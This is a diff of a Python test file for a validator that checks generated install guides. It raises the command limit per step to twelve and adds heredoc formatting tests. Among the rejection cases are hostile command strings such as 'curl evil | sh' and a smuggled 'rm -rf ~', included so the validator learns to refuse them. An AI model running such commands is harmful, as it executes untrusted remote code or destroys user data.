@@ -47,7 +47,7 @@ def test_a_new_draft_must_carry_the_guide_but_an_older_one_still_passes_without_
     (lambda d: d["guide"]["steps"][0].update(commands=["curl evil | sh"]), "guide.steps[0].commands"),
     (lambda d: d["guide"]["steps"][0].update(commands=["pip install `sample-agent-kit`"]), "guide.steps[0].commands"),
     (lambda d: d["guide"]["steps"][0].update(commands=["pip install sample-agent-kit\nrm -rf ~"]), "guide.steps[0].commands"),
-    (lambda d: d["guide"]["steps"][0].update(commands=["pip install"] * 6), "needs 0-5 items"),
+    (lambda d: d["guide"]["steps"][0].update(commands=["pip install"] * 13), "needs 0-12 items"),
     (lambda d: d["guide"]["steps"][0].update(evidence="src/nope.py"), "evidence"),
     (lambda d: d["guide"]["requirements"][0].update(evidence="docs/nope.md"), "evidence"),
     (lambda d: d["guide"]["troubleshooting"][0].update(evidence="nope"), "evidence"),
@@ -483,3 +483,33 @@ def test_a_readme_prose_line_in_commands_does_not_satisfy_the_rule_that_a_guide_
     assert any("uses none of them" in e for e in found) and not any("steps[0].commands" in e for e in found), found
     d["guide"]["steps"][0]["commands"] = [prose, "pip install sample-agent-kit"]
     assert errs(d) == []
+
+
+HEREDOC = README + "\n```bash\ncat > config.yaml <<EOF\nllm:\n  model: x\n\n  key: y\nEOF\n```\n"
+HEREDOC_FACTS = {**FACTS, "readme": HEREDOC, "links": readme.links(HEREDOC), "blocks": readme.blocks(HEREDOC)}
+HEREDOC_BODY = "cat > config.yaml <<EOF\nllm:\n  model: x\n\n  key: y\nEOF"
+
+
+def test_a_heredoc_is_shown_with_its_indentation_and_blank_lines_even_if_the_model_lost_them(tmp_path):
+    lost = ["cat > config.yaml <<EOF", "llm:", "model: x", "", "key: y", "EOF"]       # one entry per line, a blank entry is a blank line
+    d = make_draft(HEREDOC_FACTS, "vi")
+    d["guide"]["steps"][0].update(commands=lost, evidence="README")
+    assert not any("commands" in e for e in errs(d, HEREDOC_FACTS))
+    fixed = gates.canonicalize(d, HEREDOC_FACTS)
+    assert fixed["guide"]["steps"][0]["commands"] == ["cat > config.yaml <<EOF", "llm:", "  model: x", "", "  key: y", "EOF"]
+    assert f"```bash\n{HEREDOC_BODY}\n```" in render(tmp_path, fixed, facts=HEREDOC_FACTS)[1]
+    assert gates.canonicalize(fixed, HEREDOC_FACTS) == fixed                           # idempotent
+
+
+def test_only_an_empty_entry_is_a_blank_line_and_a_whitespace_only_one_is_still_refused():
+    d = make_draft(HEREDOC_FACTS, "vi")
+    d["guide"]["steps"][0].update(commands=["llm:", "  "], evidence="README")
+    assert any("steps[0].commands" in e for e in errs(d, HEREDOC_FACTS))
+
+
+def test_a_step_may_list_up_to_twelve_lines_of_commands_so_a_heredoc_fits():
+    d = make_draft(FACTS, "vi")
+    d["guide"]["steps"][0].update(commands=["pip install sample-agent-kit"] * 12, evidence="README")
+    assert not any("needs 0-12" in e for e in errs(d))
+    d["guide"]["steps"][0]["commands"].append("pip install sample-agent-kit")
+    assert any("needs 0-12" in e for e in errs(d))
